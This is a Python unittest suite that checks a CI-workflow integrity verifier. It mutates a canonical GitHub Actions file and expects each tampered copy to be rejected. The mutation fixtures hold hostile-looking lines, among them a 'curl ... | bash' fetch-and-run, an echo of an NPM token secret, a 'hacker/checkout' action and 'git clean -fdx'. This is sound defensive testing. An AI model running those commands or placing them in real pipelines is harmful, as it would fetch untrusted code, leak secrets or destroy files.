"""U-P2 Wave 1: focused mutation tests for the delivery-gate verifier.

Contract: agentic-os-v0.4-u-p2-delivery-gate-contract.md §12–§13 (D-v0.4.41).

These tests drive the REAL verifier entrypoint (`main`) and public functions,
inspect actual exit codes and emitted reason codes, and prove — against the one
frozen canonical workflow and deliberately mutated copies written to temporary
directories OUTSIDE the repository — that:

  * the canonical workflow passes (exit 0, no findings);
  * every one of the 20 closed reason codes is reachable;
  * every §12.4 non-canonical construct (bypass class) fails closed;
  * findings are deterministically ordered and value-free;
  * an internal failure yields `internal_error` with no traceback;
  * the verifier never mutates the workflow and makes no network/subprocess call;
  * action pins, job ids, check names, triggers, Python lines, runner, timeouts,
    and required commands are exact; and
  * the canonical grammar rejects semantically-equivalent but non-canonical YAML.

They assert closed reason codes and observable non-mutation, never generic prose.
"""

from __future__ import annotations

import ast
import contextlib
import importlib.util
import io
import shutil
import socket
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

REPO_ROOT = Path(__file__).resolve().parent.parent
VERIFIER_PATH = REPO_ROOT / "tools" / "verify_ci_workflow.py"
WORKFLOW_PATH = REPO_ROOT / ".github" / "workflows" / "ci.yml"

CHECKOUT_SHA = "3d3c42e5aac5ba805825da76410c181273ba90b1"
SETUP_PYTHON_SHA = "5fda3b95a4ea91299a34e894583c3862153e4b97"
CHECK_NAMES = (
    "workflow-integrity",
    "tests-python-3.12",
    "tests-python-3.14",
    "distribution-smoke-python-3.12",
)
FROZEN_REASON_CODES = frozenset({
    "missing_workflow",
    "invalid_utf8",
    "crlf_present",
    "mutable_action_ref",
    "unapproved_action",
    "credential_persistence",
    "write_permission",
    "pull_request_target",
    "secret_reference",
    "continue_on_error",
    "missing_timeout",
    "missing_required_job",
    "missing_required_trigger",
    "missing_python_line",
    "missing_full_suite",
    "missing_distribution_smoke",
    "artifact_upload",
    "shell_download",
    "unexpected_workflow_shape",
    "internal_error",
})


def _load_verifier():
    spec = importlib.util.spec_from_file_location("aos_verify_ci_workflow", VERIFIER_PATH)
    assert spec is not None and spec.loader is not None, f"cannot load {VERIFIER_PATH}"
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


class VerifierTestBase(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.vcw = _load_verifier()
        cls.canonical = cls.vcw.CANONICAL_TEXT

    # -- running -----------------------------------------------------------

    def run_argv(self, argv):
        out, err = io.StringIO(), io.StringIO()
        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
            code = self.vcw.main(argv)
        return code, out.getvalue(), err.getvalue()

    def _tmp_workflow(self, data: bytes) -> Path:
        directory = Path(tempfile.mkdtemp(prefix="aos-verify-"))
        self.addCleanup(shutil.rmtree, directory, ignore_errors=True)
        path = directory / "ci.yml"
        path.write_bytes(data)
        return path

    def verify_bytes(self, data: bytes):
        path = self._tmp_workflow(data)
        return self.run_argv(["--workflow", str(path)])

    def verify_text(self, text: str):
        return self.verify_bytes(text.encode("utf-8"))

    def codes(self, out: str):
        return [line.split(" ", 1)[0] for line in out.splitlines()]

    def mutate(self, old: str, new: str, count: int = 1) -> str:
        self.assertIn(old, self.canonical, f"mutation anchor absent: {old!r}")
        return self.canonical.replace(old, new, count)


# ---------------------------------------------------------------------------
# Acceptance of the one canonical workflow.

class CanonicalAcceptanceTests(VerifierTestBase):
    def test_embedded_canonical_matches_the_real_workflow_file(self):
        """The embedded authority has not drifted from .github/workflows/ci.yml."""
        on_disk = WORKFLOW_PATH.read_bytes().decode("utf-8")
        self.assertEqual(self.canonical, on_disk)

    def test_default_target_accepts_the_canonical_workflow(self):
        code, out, err = self.run_argv([])
        self.assertEqual(code, 0, out + err)
        self.assertEqual(out, "")

    def test_explicit_workflow_flag_accepts_the_canonical_workflow(self):
        code, out, err = self.run_argv(["--workflow", str(WORKFLOW_PATH)])
        self.assertEqual(code, 0, out + err)
        self.assertEqual(out, "")

    def test_workflow_equals_flag_form_is_accepted(self):
        code, out, _ = self.run_argv([f"--workflow={WORKFLOW_PATH}"])
        self.assertEqual(code, 0, out)


# ---------------------------------------------------------------------------
# Every one of the 20 reason codes is reachable, and the vocabulary is closed.

class ReasonCodeReachabilityTests(VerifierTestBase):
    def test_reason_vocabulary_is_exactly_the_frozen_twenty(self):
        self.assertEqual(self.vcw.REASON_CODES, FROZEN_REASON_CODES)
        self.assertEqual(len(self.vcw.REASON_CODES), 20)

    def test_every_reason_code_is_reachable(self):
        reached: set[str] = set()

        def feed_text(text, expect_code=None):
            code, out, _ = self.verify_text(text)
            self.assertEqual(code, 1, out)
            found = self.codes(out)
            self.assertTrue(found)
            self.assertLessEqual(set(found), FROZEN_REASON_CODES)
            if expect_code is not None:
                self.assertIn(expect_code, found)
            reached.update(found)

        # 1. missing_workflow — a path that does not exist.
        directory = Path(tempfile.mkdtemp(prefix="aos-verify-absent-"))
        self.addCleanup(shutil.rmtree, directory, ignore_errors=True)
        code, out, _ = self.run_argv(["--workflow", str(directory / "absent.yml")])
        self.assertEqual(code, 1)
        self.assertEqual(out, "missing_workflow\n")
        reached.update(self.codes(out))

        # 2. invalid_utf8 — undecodable bytes.
        code, out, _ = self.verify_bytes(b"\xff\xfe\xfa not valid utf-8\n")
        self.assertEqual(code, 1)
        self.assertEqual(out, "invalid_utf8\n")
        reached.update(self.codes(out))

        # 3. crlf_present — canonical content with CRLF endings.
        code, out, _ = self.verify_bytes(self.canonical.replace("\n", "\r\n").encode("utf-8"))
        self.assertEqual(code, 1)
        self.assertEqual(out, "crlf_present\n")
        reached.update(self.codes(out))

        # 4. mutable_action_ref — a tag instead of the frozen SHA.
        feed_text(
            self.mutate(f"actions/checkout@{CHECKOUT_SHA}", "actions/checkout@main"),
            "mutable_action_ref",
        )
        # 5. unapproved_action — a repo off the allowlist.
        feed_text(
            self.mutate(f"uses: actions/checkout@{CHECKOUT_SHA}", f"uses: hacker/checkout@{CHECKOUT_SHA}"),
            "unapproved_action",
        )
        # 6. credential_persistence — checkout that keeps credentials.
        feed_text(
            self.mutate("persist-credentials: false", "persist-credentials: true"),
            "credential_persistence",
        )
        # 7. write_permission — a write scope.
        feed_text(self.mutate("contents: read", "contents: write"), "write_permission")
        # 8. pull_request_target — the forbidden trigger, added alongside the rest.
        feed_text(
            self.mutate("  workflow_dispatch:\n", "  workflow_dispatch:\n  pull_request_target:\n"),
            "pull_request_target",
        )
        # 9. secret_reference — a secrets context.
        feed_text(
            self.mutate(
                "        run: python3 tools/verify_ci_workflow.py",
                '        run: echo "${{ secrets.NPM_TOKEN }}" && python3 tools/verify_ci_workflow.py',
            ),
            "secret_reference",
        )
        # 10. continue_on_error — a hidden-failure step.
        feed_text(
            self.mutate("    timeout-minutes: 10\n", "    timeout-minutes: 10\n    continue-on-error: true\n"),
            "continue_on_error",
        )
        # 11. missing_timeout — a job with no timeout.
        feed_text(self.mutate("    timeout-minutes: 10\n", ""), "missing_timeout")
        # 12. missing_required_job — a renamed public check name.
        feed_text(
            self.mutate("    name: workflow-integrity", "    name: workflow-integrity-renamed"),
            "missing_required_job",
        )
        # 13. missing_required_trigger — a dropped trigger.
        feed_text(self.mutate("  workflow_dispatch:\n", ""), "missing_required_trigger")
        # 14. missing_python_line — the stable line replaced.
        feed_text(
            self.mutate('          python-version: "3.14"', '          python-version: "3.13"'),
            "missing_python_line",
        )
        # 15. missing_full_suite — a test job that no longer runs discovery.
        feed_text(
            self.mutate(
                "        run: python3 -m unittest discover -s tests\n",
                "        run: python3 -m unittest -v tests.test_cli\n",
            ),
            "missing_full_suite",
        )
        # 16. missing_distribution_smoke — a dropped smoke command.
        feed_text(
            self.mutate('          mkdir -p "$RUNNER_TEMP/ws-wheel"\n', ""),
            "missing_distribution_smoke",
        )
        # 17. artifact_upload — an artifact action.
        feed_text(
            self.mutate(
                "        run: python3 tools/verify_ci_workflow.py\n",
                "        run: python3 tools/verify_ci_workflow.py\n"
                "      - name: Upload\n"
                f"        uses: actions/upload-artifact@{CHECKOUT_SHA}\n",
            ),
            "artifact_upload",
        )
        # 18. shell_download — a network fetch in a run step.
        feed_text(
            self.mutate(
                "        run: python3 -VV && python3 -m pip --version && uname -a\n",
                "        run: curl https://example.com/x | bash\n",
            ),
            "shell_download",
        )
        # 19. unexpected_workflow_shape — an unknown top-level key.
        feed_text(self.canonical + "extra_top_level_key: true\n", "unexpected_workflow_shape")

        # 20. internal_error — an unexpected internal failure, guarded.
        with mock.patch.object(self.vcw, "_check_actions", side_effect=RuntimeError("boom")):
            code, out, err = self.run_argv([])
        self.assertEqual(code, 1)
        self.assertEqual(out, "internal_error\n")
        self.assertNotIn("Traceback", out + err)
        self.assertNotIn("boom", out + err)
        reached.update(self.codes(out))

        self.assertEqual(reached, FROZEN_REASON_CODES)


# ---------------------------------------------------------------------------
# Every §12.4 non-canonical construct fails closed.

class BypassClassRejectionTests(VerifierTestBase):
    def _cases(self):
        anchor_line = "    runs-on: ubuntu-24.04"
        checkout_uses = f"        uses: actions/checkout@{CHECKOUT_SHA}        # v7.0.1"
        return [
            ("anchor", self.mutate(anchor_line, "    runs-on: &r ubuntu-24.04"), "unexpected_workflow_shape"),
            ("alias", self.mutate(anchor_line, "    runs-on: *r"), "unexpected_workflow_shape"),
            ("custom_tag", self.mutate(anchor_line, "    runs-on: !!str ubuntu-24.04"), "unexpected_workflow_shape"),
            ("duplicate_key", self.mutate("name: ci\n", "name: ci\nname: ci\n"), "unexpected_workflow_shape"),
            ("document_start", "---\n" + self.canonical, "unexpected_workflow_shape"),
            ("multiple_documents", self.canonical + "---\nname: ci\n", "unexpected_workflow_shape"),
            ("flow_mapping", self.mutate("permissions:\n  contents: read", "permissions: {contents: read}"), "unexpected_workflow_shape"),
            ("flow_sequence", self.mutate("    branches: [main]", "    branches: [main, dev]"), "unexpected_workflow_shape"),
            ("quoted_key", self.mutate("permissions:\n", '"permissions":\n'), "unexpected_workflow_shape"),
            # An alternate boolean spelling is caught by the more specific
            # credential_persistence code (§12.4 permits a more specific code).
            ("alternate_boolean", self.mutate("persist-credentials: false", "persist-credentials: False"), "credential_persistence"),
            ("job_level_permissions", self.mutate(
                "    runs-on: ubuntu-24.04\n    timeout-minutes: 10\n",
                "    runs-on: ubuntu-24.04\n    permissions:\n      contents: read\n    timeout-minutes: 10\n",
            ), "unexpected_workflow_shape"),
            ("local_action", self.mutate(checkout_uses, "        uses: ./.github/actions/local-checkout"), "unexpected_workflow_shape"),
            ("reusable_workflow", self.mutate(
                "jobs:\n",
                f"jobs:\n  reusable:\n    uses: octo-org/repo/.github/workflows/x.yml@{CHECKOUT_SHA}\n",
            ), "unexpected_workflow_shape"),
            ("folded_uses", self.mutate(
                checkout_uses,
                f"        uses: >-\n          actions/checkout@{CHECKOUT_SHA}",
            ), "unexpected_workflow_shape"),
            ("unexpected_block_scalar", self.mutate(
                "        run: python3 tools/verify_ci_workflow.py",
                "        run: >\n          python3 tools/verify_ci_workflow.py",
            ), "unexpected_workflow_shape"),
            ("unknown_step_key", self.mutate(
                "      - name: Verify workflow integrity\n",
                "      - name: Verify workflow integrity\n        unknownkey: value\n",
            ), "unexpected_workflow_shape"),
            # Shell indirection that WRAPS the frozen command: the substring is
            # still present, proving acceptance is affirmative recognition, not
            # substring search.
            ("shell_indirection", self.mutate(
                "        run: python3 -m unittest discover -s tests",
                '        run: bash -c "python3 -m unittest discover -s tests"',
            ), "unexpected_workflow_shape"),
        ]

    def test_every_bypass_class_fails_closed(self):
        for name, text, expected in self._cases():
            with self.subTest(bypass=name):
                code, out, err = self.verify_text(text)
                self.assertEqual(code, 1, f"{name}: expected exit 1\n{out}{err}")
                found = self.codes(out)
                self.assertTrue(found, f"{name}: expected at least one finding")
                self.assertLessEqual(set(found), FROZEN_REASON_CODES, name)
                self.assertIn(expected, found, f"{name}: got {found}")

    def test_shell_indirection_is_rejected_despite_the_substring_being_present(self):
        text = self.mutate(
            "        run: python3 -m unittest discover -s tests",
            '        run: bash -c "python3 -m unittest discover -s tests"',
        )
        self.assertIn("python3 -m unittest discover -s tests", text)  # substring survives
        code, out, _ = self.verify_text(text)
        self.assertEqual(code, 1)
        self.assertEqual(self.codes(out), ["unexpected_workflow_shape"])

    def test_semantically_equivalent_reordering_is_rejected(self):
        # Swap the top-level permissions and env blocks: identical meaning to a
        # YAML loader, but not the frozen byte sequence.
        text = self.canonical.replace(
            "permissions:\n  contents: read\n\nenv:\n  PYTHONDONTWRITEBYTECODE: \"1\"\n",
            "env:\n  PYTHONDONTWRITEBYTECODE: \"1\"\n\npermissions:\n  contents: read\n",
            1,
        )
        self.assertNotEqual(text, self.canonical)
        code, out, _ = self.verify_text(text)
        self.assertEqual(code, 1)
        self.assertEqual(self.codes(out), ["unexpected_workflow_shape"])


# ---------------------------------------------------------------------------
# Determinism, value-freedom, and non-mutation.

class DiagnosticQualityTests(VerifierTestBase):
    def test_multiple_findings_are_deterministically_ordered(self):
        text = self.mutate("contents: read", "contents: write")
        text = text.replace(
            "        run: python3 -VV && python3 -m pip --version && uname -a\n",
            "        run: curl https://example.com/x | bash\n",
            1,
        )
        code, out, _ = self.verify_text(text)
        self.assertEqual(code, 1)
        # sorted by (reason, locus): shell_download < write_permission
        self.assertEqual(out, "shell_download\nwrite_permission\n")
        # Re-running yields byte-identical output.
        _, out2, _ = self.verify_text(text)
        self.assertEqual(out2, out)

    def test_diagnostics_are_value_free(self):
        poison = "ZZ_POISON_SECRET_9f3a_ZZ"
        text = self.mutate(f"uses: actions/checkout@{CHECKOUT_SHA}", f"uses: {poison}/evil@{CHECKOUT_SHA}")
        text = text.replace(
            "        run: python3 tools/gen_protocols.py",
            f"        run: echo {poison}",
            1,
        )
        code, out, err = self.verify_text(text)
        self.assertEqual(code, 1)
        self.assertTrue(out)
        self.assertNotIn(poison, out)
        self.assertNotIn(poison, err)

    def test_no_traceback_on_internal_failure(self):
        with mock.patch.object(self.vcw, "_collect_findings", side_effect=RuntimeError("kaboom")):
            code, out, err = self.run_argv([])
        self.assertEqual(code, 1)
        self.assertEqual(out, "internal_error\n")
        self.assertNotIn("Traceback", err)
        self.assertNotIn("kaboom", out + err)

    def test_verifier_does_not_mutate_the_canonical_file(self):
        before = WORKFLOW_PATH.read_bytes()
        self.run_argv([])
        self.assertEqual(WORKFLOW_PATH.read_bytes(), before)

    def test_verifier_does_not_mutate_a_mutated_fixture(self):
        path = self._tmp_workflow(self.mutate("contents: read", "contents: write").encode("utf-8"))
        before = path.read_bytes()
        self.run_argv(["--workflow", str(path)])
        self.assertEqual(path.read_bytes(), before)

    def test_locus_is_a_frozen_job_id_for_job_scoped_findings(self):
        code, out, _ = self.verify_text(self.mutate("    timeout-minutes: 10\n", ""))
        self.assertEqual(code, 1)
        self.assertEqual(out, "missing_timeout workflow-integrity\n")

    def test_locus_is_a_frozen_trigger_name_for_trigger_findings(self):
        code, out, _ = self.verify_text(self.mutate("  workflow_dispatch:\n", ""))
        self.assertEqual(code, 1)
        self.assertEqual(out, "missing_required_trigger workflow_dispatch\n")

    def test_locus_is_a_line_number_for_action_findings(self):
        target = f"        uses: actions/checkout@{CHECKOUT_SHA}        # v7.0.1"
        line_number = self.canonical.split("\n").index(target) + 1
        code, out, _ = self.verify_text(self.mutate(target, target.replace(CHECKOUT_SHA, "deadbeef")))
        self.assertEqual(code, 1)
        self.assertEqual(out, f"mutable_action_ref line:{line_number}\n")


# ---------------------------------------------------------------------------
# No network, no subprocess.

class IsolationTests(VerifierTestBase):
    def test_verifier_imports_only_stdlib_and_no_network_or_subprocess(self):
        tree = ast.parse(VERIFIER_PATH.read_text())
        imported: set[str] = set()
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                for alias in node.names:
                    imported.add(alias.name.split(".")[0])
            elif isinstance(node, ast.ImportFrom) and node.module:
                imported.add(node.module.split(".")[0])
        self.assertLessEqual(imported, {"__future__", "re", "sys", "pathlib"})

    def test_verifier_never_opens_a_socket_or_spawns_a_subprocess(self):
        boom = AssertionError("network or subprocess used")
        with mock.patch.object(socket, "socket", side_effect=boom), \
                mock.patch.object(subprocess, "Popen", side_effect=boom), \
                mock.patch.object(subprocess, "run", side_effect=boom):
            code, out, err = self.run_argv([])
            self.assertEqual(code, 0, out + err)
            code, out, _ = self.verify_text(self.mutate("contents: read", "contents: write"))
            self.assertEqual(code, 1)


# ---------------------------------------------------------------------------
# Exactness of pins, names, triggers, lines, runner, timeouts, and commands.

class ExactnessTests(VerifierTestBase):
    def test_action_pins_are_the_frozen_shas(self):
        self.assertIn(f"actions/checkout@{CHECKOUT_SHA}", self.canonical)
        self.assertIn(f"actions/setup-python@{SETUP_PYTHON_SHA}", self.canonical)
        self.assertEqual(
            self.vcw.ACTION_ALLOWLIST,
            {"actions/checkout": CHECKOUT_SHA, "actions/setup-python": SETUP_PYTHON_SHA},
        )

    def test_a_wrong_sha_is_rejected_as_mutable(self):
        wrong = "0" * 40
        code, out, _ = self.verify_text(
            self.mutate(f"actions/checkout@{CHECKOUT_SHA}", f"actions/checkout@{wrong}")
        )
        self.assertEqual(code, 1)
        self.assertIn("mutable_action_ref", self.codes(out))

    def test_all_four_public_check_names_are_present(self):
        for name in CHECK_NAMES:
            self.assertIn(f"    name: {name}\n", self.canonical)

    def test_all_four_job_ids_are_present(self):
        for job_id in ("workflow-integrity", "tests-python-3-12", "tests-python-3-14", "distribution-smoke-python-3-12"):
            self.assertIn(f"  {job_id}:\n", self.canonical)

    def test_exact_runner_label_is_required(self):
        code, out, _ = self.verify_text(self.mutate("    runs-on: ubuntu-24.04", "    runs-on: ubuntu-latest"))
        self.assertEqual(code, 1)
        self.assertEqual(self.codes(out), ["unexpected_workflow_shape"])

    def test_exact_timeout_value_is_required(self):
        code, out, _ = self.verify_text(self.mutate("    timeout-minutes: 10", "    timeout-minutes: 20"))
        self.assertEqual(code, 1)
        self.assertEqual(self.codes(out), ["unexpected_workflow_shape"])

    def test_top_level_permissions_are_exactly_contents_read(self):
        self.assertIn("permissions:\n  contents: read\n", self.canonical)

    def test_no_job_level_permissions_block_is_accepted(self):
        text = self.mutate(
            "    runs-on: ubuntu-24.04\n    timeout-minutes: 10\n",
            "    runs-on: ubuntu-24.04\n    permissions:\n      contents: read\n    timeout-minutes: 10\n",
        )
        code, out, _ = self.verify_text(text)
        self.assertEqual(code, 1)
        self.assertEqual(self.codes(out), ["unexpected_workflow_shape"])

    def test_persist_credentials_false_on_every_checkout(self):
        self.assertEqual(self.canonical.count(f"uses: actions/checkout@{CHECKOUT_SHA}"), 4)
        self.assertEqual(self.canonical.count("persist-credentials: false"), 4)

    def test_exact_triggers_are_present(self):
        for trigger in ("  pull_request:\n", "  push:\n", "  workflow_dispatch:\n"):
            self.assertIn(trigger, self.canonical)

    def test_both_python_feature_lines_are_present(self):
        self.assertIn('python-version: "3.12"', self.canonical)
        self.assertIn('python-version: "3.14"', self.canonical)

    def test_full_suite_command_is_required_in_both_test_jobs(self):
        self.assertEqual(self.canonical.count("python3 -m unittest discover -s tests"), 2)
        code, out, _ = self.verify_text(
            self.mutate(
                "        run: python3 -m unittest discover -s tests\n",
                "        run: python3 -m unittest -v tests.test_cli\n",
            )
        )
        self.assertEqual(code, 1)
        self.assertEqual(out, "missing_full_suite tests-python-3-12\n")

    def test_no_artifact_action_local_action_reusable_workflow_or_secret_context(self):
        self.assertNotIn("upload-artifact", self.canonical)
        self.assertNotIn("download-artifact", self.canonical)
        self.assertNotIn("secrets.", self.canonical)
        self.assertNotIn("continue-on-error", self.canonical)
        self.assertNotIn("pull_request_target", self.canonical)
        self.assertNotIn("uses: ./", self.canonical)


# ---------------------------------------------------------------------------
# Distribution-smoke shape: workspace preconditions and bounded cleanup.

class DistributionSmokeShapeTests(VerifierTestBase):
    def test_both_workspace_mkdir_commands_exist(self):
        self.assertIn('mkdir -p "$RUNNER_TEMP/ws-wheel"', self.canonical)
        self.assertIn('mkdir -p "$RUNNER_TEMP/ws-zipapp"', self.canonical)

    def test_removing_ws_wheel_mkdir_is_rejected(self):
        code, out, _ = self.verify_text(self.mutate('          mkdir -p "$RUNNER_TEMP/ws-wheel"\n', ""))
        self.assertEqual(code, 1)
        self.assertEqual(out, "missing_distribution_smoke distribution-smoke-python-3-12\n")

    def test_removing_ws_zipapp_mkdir_is_rejected(self):
        code, out, _ = self.verify_text(self.mutate('          mkdir -p "$RUNNER_TEMP/ws-zipapp"\n', ""))
        self.assertEqual(code, 1)
        self.assertEqual(out, "missing_distribution_smoke distribution-smoke-python-3-12\n")

    def test_bounded_build_residue_cleanup_exists_and_git_clean_does_not(self):
        self.assertIn("rm -rf build agentic_os.egg-info", self.canonical)
        self.assertNotIn("git clean", self.canonical)

    def test_removing_bounded_cleanup_is_rejected(self):
        code, out, _ = self.verify_text(self.mutate("          rm -rf build agentic_os.egg-info\n", ""))
        self.assertEqual(code, 1)
        self.assertEqual(out, "missing_distribution_smoke distribution-smoke-python-3-12\n")

    def test_adding_git_clean_is_rejected(self):
        text = self.mutate(
            "          rm -rf build agentic_os.egg-info\n",
            "          git clean -fdx\n          rm -rf build agentic_os.egg-info\n",
        )
        code, out, _ = self.verify_text(text)
        self.assertEqual(code, 1)
        self.assertEqual(self.codes(out), ["unexpected_workflow_shape"])

    def test_no_isolation_wheel_build_command_is_present(self):
        self.assertIn("python3 -m build --wheel --no-isolation", self.canonical)

    def test_zipapp_build_command_is_present(self):
        self.assertIn("python3 tools/build_zipapp.py --output", self.canonical)


# ---------------------------------------------------------------------------
# Usage errors.

class UsageErrorTests(VerifierTestBase):
    def test_unknown_argument_is_a_usage_error(self):
        code, out, err = self.run_argv(["--bogus"])
        self.assertEqual(code, 2)
        self.assertEqual(out, "")
        self.assertIn("usage:", err)

    def test_workflow_flag_without_value_is_a_usage_error(self):
        code, out, err = self.run_argv(["--workflow"])
        self.assertEqual(code, 2)
        self.assertEqual(out, "")
        self.assertIn("usage:", err)


if __name__ == "__main__":
    unittest.main()
